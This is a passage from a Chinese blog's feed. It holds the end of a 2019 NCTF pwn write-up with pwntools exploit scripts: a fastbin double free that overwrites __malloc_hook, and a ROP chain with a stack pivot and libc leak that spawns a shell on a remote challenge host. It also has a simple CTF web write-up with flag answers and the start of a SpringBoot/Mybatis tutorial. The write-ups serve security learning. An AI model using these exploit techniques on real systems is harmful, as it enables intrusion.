[0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line"> add(0x68,'\x13' * 0x68)</span><br><span class="line"> add(0x68,'\x14' * 0x68)</span><br><span class="line"> free(6)</span><br><span class="line"> free(7)</span><br><span class="line"> free(6)</span><br><span class="line"> add(0x68,p64(__malloc_hook - 0x23))</span><br><span class="line"> add(0x68,p64(__malloc_hook - 0x23))</span><br><span class="line"> add(0x68,p64(__malloc_hook - 0x23))</span><br><span class="line"> payload = '\x00' * 3</span><br><span class="line"> payload += p64(0) * 2</span><br><span class="line"> payload += p64(libc+one_gadget[3])</span><br><span class="line"> add(0x68,payload)</span><br><span class="line"> sh.sendlineafter("4.","1")</span><br><span class="line"> sh.sendlineafter("?","666")</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("139.129.76.65",50001,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x05-easy-rop"><a href="#0x05-easy-rop" class="headerlink" title="0x05 easy_rop"></a>0x05 easy_rop</h2><hr><h3 id="利用-d的非正规字符绕过canary，然后顺便读取canary和pie，然后在栈里发现vulnerable-function的指针，然后通过pop，让ret-addr指向该指针，再一次进入vulnerable-function-然后设置好rbp为new-stack，ret-addr为leave-ret即可栈迁移，栈迁移之后先libc-leak，然后利用万能gadget调用read再一次更新new-stack的数据，将ret-addr指向system-“-bin-sh-x00”-就可以拿到shell了，中间少了负数的处理。所以要多打几次才能拿shell。"><a href="#利用-d的非正规字符绕过canary，然后顺便读取canary和pie，然后在栈里发现vulnerable-function的指针，然后通过pop，让ret-addr指向该指针，再一次进入vulnerable-function-然后设置好rbp为new-stack，ret-addr为leave-ret即可栈迁移，栈迁移之后先libc-leak，然后利用万能gadget调用read再一次更新new-stack的数据，将ret-addr指向system-“-bin-sh-x00”-就可以拿到shell了，中间少了负数的处理。所以要多打几次才能拿shell。" class="headerlink" title="利用%d的非正规字符绕过canary，然后顺便读取canary和pie，然后在栈里发现vulnerable_function的指针，然后通过pop，让ret_addr指向该指针，再一次进入vulnerable_function,然后设置好rbp为new_stack，ret_addr为leave_ret即可栈迁移，栈迁移之后先libc leak，然后利用万能gadget调用read再一次更新new_stack的数据，将ret_addr指向system(“/bin/sh\x00”)就可以拿到shell了，中间少了负数的处理。所以要多打几次才能拿shell。"></a>利用%d的非正规字符绕过canary，然后顺便读取canary和pie，然后在栈里发现vulnerable_function的指针，然后通过pop，让ret_addr指向该指针，再一次进入vulnerable_function,然后设置好rbp为new_stack，ret_addr为leave_ret即可栈迁移，栈迁移之后先libc leak，然后利用万能gadget调用read再一次更新new_stack的数据，将ret_addr指向system(“/bin/sh\x00”)就可以拿到shell了，中间少了负数的处理。所以要多打几次才能拿shell。</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("easy_rop")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./easy_rop")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> for i in range(26):</span><br><span class="line">  sh.sendlineafter(":",str(0))</span><br><span class="line"> sh.sendlineafter(":","--")</span><br><span class="line"> sh.recvuntil("number 26 = ")</span><br><span class="line"> canary = int(sh.recvuntil("\nnumber 27:",True),10)</span><br><span class="line"> sh.recvuntil("number 27 = ")</span><br><span class="line"> canary_head = int(sh.recvuntil("\nnumber 28",True),10)</span><br><span class="line"> canary = canary + (canary_head<<32) </span><br><span class="line"> sh.sendlineafter(":","--")</span><br><span class="line"> sh.recvuntil("number 28 = ")</span><br><span class="line"> pie = int(sh.recvuntil("\nnumber 29:",True),10)</span><br><span class="line"> sh.recvuntil("number 29 = ")</span><br><span class="line"> pie = (int(sh.recvuntil("\nnumber 30",True),10) << 32) + pie </span><br><span class="line"> pie -= 0xb40</span><br><span class="line"> pop_rbp_ret = pie + 0x900</span><br><span class="line"> leave_ret = pie + 0xb31</span><br><span class="line"> pop3_ret = pie + 0xb9f</span><br><span class="line"> new_stack = pie + 0x201420 - 8</span><br><span class="line"> pop_rdi_ret = pie + 0xba3</span><br><span class="line"> pop_rsi_r15_ret = pie + 0xba1</span><br><span class="line"> pop6_ret = 0xB9A + pie</span><br><span class="line"> call_gadget = 0xB80 + pie</span><br><span class="line"> def send(num):</span><br><span class="line">  if(num % 0x100000000 > 0x7fffffff):</span><br><span class="line">   sh.sendlineafter(":",str((-1 * num) % 0x100000000))</span><br><span class="line">  else:</span><br><span class="line">   sh.sendlineafter(":",str(num % 0x100000000))</span><br><span class="line">  sh.sendlineafter(":",str(num>>32))</span><br><span class="line"> send(pop3_ret)</span><br><span class="line"> send(new_stack)</span><br><span class="line"> payload  = "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> sh.sendlineafter("?",payload)</span><br><span class="line"> for i in range(28):</span><br><span class="line">  sh.sendlineafter(":",'-')</span><br><span class="line"> send(new_stack)</span><br><span class="line"> send(leave_ret)</span><br><span class="line"> sh.sendlineafter(":","--")</span><br><span class="line"> payload  = p64(pop_rdi_ret)</span><br><span class="line"> payload += p64(elf.got['__libc_start_main'] + pie)</span><br><span class="line"> payload += p64(elf.plt['puts'] + pie)</span><br><span class="line"> payload += p64(pop6_ret)</span><br><span class="line"> payload += p64(0) + p64(1) + p64(pie + elf.got['read']) + p64(0x666) + p64(new_stack + 8) + p64(0)</span><br><span class="line"> payload += p64(call_gadget)</span><br><span class="line"> sh.sendlineafter("?",payload)</span><br><span class="line"> __libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))</span><br><span class="line"> libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line"> system = libc +lib.symbols['system']</span><br><span class="line"> binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line"> __free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line"> __malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line"> payload = 'a' * 80</span><br><span class="line"> payload += p64(pop_rdi_ret)</span><br><span class="line"> payload += p64(binsh)</span><br><span class="line"> payload += p64(system)</span><br><span class="line"> sleep(0.2)</span><br><span class="line"> sh.sendline(payload)</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("139.129.76.65",50002,0)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;CTF-2019NCTF-南邮CTF&quot;&gt;&lt;a href=&quot;#CTF-2019NCTF-南邮CTF&quot; class=&quot;headerlink&quot; title=&quot;CTF-2019NCTF-南邮CTF&quot;&gt;&lt;/a&gt;CTF-201
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-2019年11月成都大学CTF</title>
    <link href="http://yoursite.com/2019/11/13/CTF-2019%E5%B9%B411%E6%9C%88%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6CTF/"/>
    <id>http://yoursite.com/2019/11/13/CTF-2019%E5%B9%B411%E6%9C%88%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6CTF/</id>
    <published>2019-11-13T06:00:43.000Z</published>
    <updated>2019-11-13T11:05:14.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1、POST"><a href="#1、POST" class="headerlink" title="1、POST"></a>1、POST</h2><hr><h3 id="打开网页，输出以下内容"><a href="#打开网页，输出以下内容" class="headerlink" title="打开网页，输出以下内容"></a>打开网页，输出以下内容</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><!--?php</span--><br><span class="line">error_reporting(0);</span><br><span class="line">include('flag.php');</span><br><span class="line">if($_GET['p1'] == '' or $_GET['p2'] == '') {</span><br><span class="line">    header('location: index.php?p1=CDUSEC&p2=CTF');</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">highlight_file('index.php');</span><br><span class="line">print $_GET['p1'];</span><br><span class="line">print '<br>';</span><br><span class="line">print $_GET['p2'];</span><br><span class="line">print '<br>';</span><br><span class="line"></span><br><span class="line">if($_POST['p4'] === 'flag') {</span><br><span class="line">    print $flag;</span><br><span class="line">}</span><br></span></pre></td></tr></tbody></table></figure></div><h3 id="题目要求GET传参p1、p2为非空值，POST传参p4为flag字符串"><a href="#题目要求GET传参p1、p2为非空值，POST传参p4为flag字符串" class="headerlink" title="题目要求GET传参p1、p2为非空值，POST传参p4为flag字符串"></a>题目要求GET传参p1、p2为非空值，POST传参p4为flag字符串</h3><h3 id="使用Burp-Suite发包即可，封包如下"><a href="#使用Burp-Suite发包即可，封包如下" class="headerlink" title="使用Burp Suite发包即可，封包如下"></a>使用Burp Suite发包即可，封包如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?p1=CDUSEC&p2=CTF HTTP/1.1</span><br><span class="line">Host: 47.93.249.236:10007</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 7</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">p4=flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="发送后输出flag-Tw0-E4sy-pHp"><a href="#发送后输出flag-Tw0-E4sy-pHp" class="headerlink" title="发送后输出flag{Tw0~E4sy-pHp}"></a>发送后输出flag{Tw0~E4sy-pHp}</h3><h2 id="2、百度"><a href="#2、百度" class="headerlink" title="2、百度"></a>2、百度</h2><hr><h3 id="打开网页后没有什么提示，于是看一下源码也没有什么提示，然后再看一下封包也没有什么提示，那么必须要扫一下目录了"><a href="#打开网页后没有什么提示，于是看一下源码也没有什么提示，然后再看一下封包也没有什么提示，那么必须要扫一下目录了" class="headerlink" title="打开网页后没有什么提示，于是看一下源码也没有什么提示，然后再看一下封包也没有什么提示，那么必须要扫一下目录了"></a>打开网页后没有什么提示，于是看一下源码也没有什么提示，然后再看一下封包也没有什么提示，那么必须要扫一下目录了</h3><h3 id="用御剑扫一下目录，发现robots-txt，打开后输出flag"><a href="#用御剑扫一下目录，发现robots-txt，打开后输出flag" class="headerlink" title="用御剑扫一下目录，发现robots.txt，打开后输出flag"></a>用御剑扫一下目录，发现robots.txt，打开后输出flag</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#flag{BoBo-RoRo-ToTo}</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br></pre></td></tr></tbody></table></figure></div><h3 id="得到flag-BoBo-RoRo-ToTo"><a href="#得到flag-BoBo-RoRo-ToTo" class="headerlink" title="得到flag{BoBo-RoRo-ToTo}"></a>得到flag{BoBo-RoRo-ToTo}</h3></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;1、POST&quot;&gt;&lt;a href=&quot;#1、POST&quot; class=&quot;hea
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot+Mybatis+Thymeleaf_基础开发</title>
    <link href="http://yoursite.com/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/"/>
    <id>http://yoursite.com/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/</id>
    <published>2019-11-05T00:46:02.000Z</published>
    <updated>2019-11-05T11:11:24.000Z</updated>
    
    <content type="html"><![CDATA[<html lang="en" xmlns:th="http://www.thymeleaf.org"><head></head><body><h1 id="SpringBoot-Mybatis-简单的测试"><a href="#SpringBoot-Mybatis-简单的测试" class="headerlink" title="SpringBoot + Mybatis 简单的测试"></a>SpringBoot + Mybatis 简单的测试</h1><h2 id="1、基础配置"><a href="#1、基础配置" class="headerlink" title="1、基础配置"></a>1、基础配置</h2><hr><h3 id="首先我们对环境进行配置，pom-xml的dependencies配置如下"><a href="#首先我们对环境进行配置，pom-xml的dependencies配置如下" class="headerlink" title="首先我们对环境进行配置，pom.xml的dependencies配置如下"></a>首先我们对环境进行配置，pom.xml的dependencies配置如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><dependencies></dependencies></span><br><span class="line">    <dependency></dependency></span><br><span class="line">        <groupid>org.springframework.boot</groupid></span><br><span class="line">        <artifactid>spring-boot-starter-thymeleaf</artifactid></span><br><span class="line">    </span><br><span class="line">    <dependency></dependency></span><br><span class="line">        <groupid>org.springframework.boot</groupid></span><br><span class="line">        <artifactid>spring-boot-starter-web</artifactid></span><br><span class="line">    </span><br><span class="line">    <dependency></dependency></span><br><span class="line">        <groupid>org.springframework.boot</groupid></span><br><span class="line">        <artifactid>spring-boot-starter-test</artifactid></span><br><span class="line">        <scope>test</scope></span><br><span class="line">        <exclusions></exclusions></span><br><span class="line">            <exclusion></exclusion></span><br><span class="line">                <groupid>org.junit.vintage</groupid></span><br><span class="line">                <artifactid>junit-vintage-engine</artifactid></span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    <dependency></dependency></span><br><span class="line">        <groupid>mysql</groupid></span><br><span class="line">        <artifactid>mysql-connector-java</artifactid></span><br><span class="line">        <version>8.0.17</version></span><br><span class="line">    </span><br><span class="line">    <dependency></dependency></span><br><span class="line">        <groupid>org.mybatis.spring.boot</groupid></span><br><span class="line">        <artifactid>mybatis-spring-boot-starter</artifactid></span><br><span class="line">        <version>2.0.0</version></span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><h3 id="经过测试mybatis为默认，mysql为8-0-17，springboot只需要用默认的即可，thymeleaf也是用默认的即可。"><a href="#经过测试mybatis为默认，mysql为8-0-17，springboot只需要用默认的即可，thymeleaf也是用默认的即可。" class="headerlink" title="经过测试mybatis为默认，mysql为8.0.17，springboot只需要用默认的即可，thymeleaf也是用默认的即可。"></a>经过测试mybatis为默认，mysql为8.0.17，springboot只需要用默认的即可，thymeleaf也是用默认的即可。</h3><h3 id="然后对application-properties进行配置，配置如下："><a href="#然后对application-properties进行配置，配置如下：" class="headerlink" title="然后对application.properties进行配置，配置如下："></a>然后对application.properties进行配置，配置如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/数据库名?useUnicode=true&characterEncoding=UTF-8&serverTimezone=UTC</span><br><span class="line">spring.datasource.username=数据库登录账号</span><br><span class="line">spring.datasource.password=数据库登录密码</span><br><span class="line">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line">mybatis.mapper-locations=classpath:mapping/*.xml    #locations目录默认以resources为根目录</span><br></pre></td></tr></tbody></table></figure></div><h2 id="2、SpringBoot-Mybatis-的层"><a href="#2、SpringBoot-Mybatis-的层" class="headerlink" title="2、SpringBoot + Mybatis 的层"></a>2、SpringBoot + Mybatis 的层</h2><hr><h3 id="一般情况下我们分为四层"><a href="#一般情况下我们分为四层" class="headerlink" title="一般情况下我们分为四层"></a>一般情况下我们分为四层</h3><h3 id="controller层：调用service层的接口，进行业务操作。"><a href="#controller层：调用service层的接口，进行业务操作。" class="headerlink" title="controller层：调用service层的接口，进行业务操作。"></a>controller层：调用service层的接口，进行业务操作。</h3><h3 id="entity层：entity层和model层等价，存放的是实体类，属性值与数据库中的属性值保持一致。实现set和get方法（这一步不可以少，少一个get或者set都不行，只需要默认的get和set即可）。"><a href="#entity层：entity层和model层等价，存放的是实体类，属性值与数据库中的属性值保持一致。实现set和get方法（这一步不可以少，少一个get或者set都不行，只需要默认的get和set即可）。" class="headerlink" title="entity层：entity层和model层等价，存放的是实体类，属性值与数据库中的属性值保持一致。实现set和get方法（这一步不可以少，少一个get或者set都不行，只需要默认的get和set即可）。"></a>entity层：entity层和model层等价，存放的是实体类，属性值与数据库中的属性值保持一致。实现set和get方法（这一步不可以少，少一个get或者set都不行，只需要默认的get和set即可）。</h3><h3 id="mapper层：dao层和mapper层等价，对数据库进行持久化操作，它的方法是针对数据库操作的，基本用到的就是增删改查。他只是定义一个接口，然后在mapper-xml中实现接口和数据库的交互。"><a href="#mapper层：dao层和mapper层等价，对数据库进行持久化操作，它的方法是针对数据库操作的，基本用到的就是增删改查。他只是定义一个接口，然后在mapper-xml中实现接口和数据库的交互。" class="headerlink" title="mapper层：dao层和mapper层等价，对数据库进行持久化操作，它的方法是针对数据库操作的，基本用到的就是增删改查。他只是定义一个接口，然后在mapper.xml中实现接口和数据库的交互。"></a>mapper层：dao层和mapper层等价，对数据库进行持久化操作，它的方法是针对数据库操作的，基本用到的就是增删改查。他只是定义一个接口，然后在mapper.xml中实现接口和数据库的交互。</h3><h3 id="service层：存放业务逻辑处理，不直接对数据库进行操作，有接口和接口实现类，提供controller层调用方法。"><a href="#service层：存放业务逻辑处理，不直接对数据库进行操作，有接口和接口实现类，提供controller层调用方法。" class="headerlink" title="service层：存放业务逻辑处理，不直接对数据库进行操作，有接口和接口实现类，提供controller层调用方法。"></a>service层：存放业务逻辑处理，不直接对数据库进行操作，有接口和接口实现类，提供controller层调用方法。</h3><h3 id="在resources类中创建一个包，用于存放Mapper-xml"><a href="#在resources类中创建一个包，用于存放Mapper-xml" class="headerlink" title="在resources类中创建一个包，用于存放Mapper.xml"></a>在resources类中创建一个包，用于存放Mapper.xml</h3><h3 id="具体分布如下图所示"><a href="#具体分布如下图所示" class="headerlink" title="具体分布如下图所示"></a>具体分布如下图所示</h3><p><a href="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/1.png" class="lazyload"></a></p><h2 id="3、代码实现"><a href="#3、代码实现" class="headerlink" title="3、代码实现"></a>3、代码实现</h2><hr><h3 id="controller层：UserController"><a href="#controller层：UserController" class="headerlink" title="controller层：UserController"></a>controller层：UserController</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.controller;</span><br><span class="line">import com.example.demo.entity.User;</span><br><span class="line">import com.example.demo.service.UserServiceImpl;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line">import java.util.List;</span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping("/testBoot")</span><br><span class="line">public class UserController {</span><br><span class="line">    @Autowired</span><br><span class="line">    private UserService userService;</span><br><span class="line">    @RequestMapping(value = "/getUsers",method = RequestMethod.GET)</span><br><span class="line">    public List<user> GetUsers(){</user></span><br><span class="line">        return userService.getUsers();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="entity层：User"><a href="#entity层：User" class="headerlink" title="entity层：User"></a>entity层：User</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.entity;</span><br><span class="line">public class User {</span><br><span class="line">    private Integer id;</span><br><span class="line">    private String name;</span><br><span class="line">    private String account;</span><br><span class="line">    private String password;</span><br><span class="line">    private String email;</span><br><span class="line">    @Override</span><br><span class="line">    public String toString() {</span><br><span class="line">        return "id = " + getId();</span><br><span class="line">    }</span><br><span class="line">    public void setId(Integer id) {</span><br><span class="line">        this.id = id;</span><br><span class="line">    }</span><br><span class="line">    public Integer getId() {</span><br><span class="line">        return id;</span><br><span class="line">    }</span><br><span class="line">    public String getName() {</span><br><span class="line">        return name;</span><br><span class="line">    }</span><br><span class="line">    public void setName(String name) {</span><br><span class="line">        this.name = name;</span><br><span class="line">    }</span><br><span class="line">    public void setAccount(String account) {</span><br><span class="line">        this.account = account;</span><br><span class="line">    }</span><br><span class="line">    public String getAccount() {</span><br><span class="line">        return account;</span><br><span class="line">    }</span><br><span class="line">    public void setPassword(String password) {</span><br><span class="line">        this.password = password;</span><br><span class="line">    }</span><br><span class="line">    public String getPassword() {</span><br><span class="line">        return password;</span><br><span class="line">    }</span><br><span class="line">    public void setEmail(String email) {</span><br><span class="line">        this.email = email;</span><br><span class="line">    }</span><br><span class="line">    public String getEmail() {</span><br><span class="line">        return email;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="mapper层：UserMapper"><a href="#mapper层：UserMapper" class="headerlink" title="mapper层：UserMapper"></a>mapper层：UserMapper</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 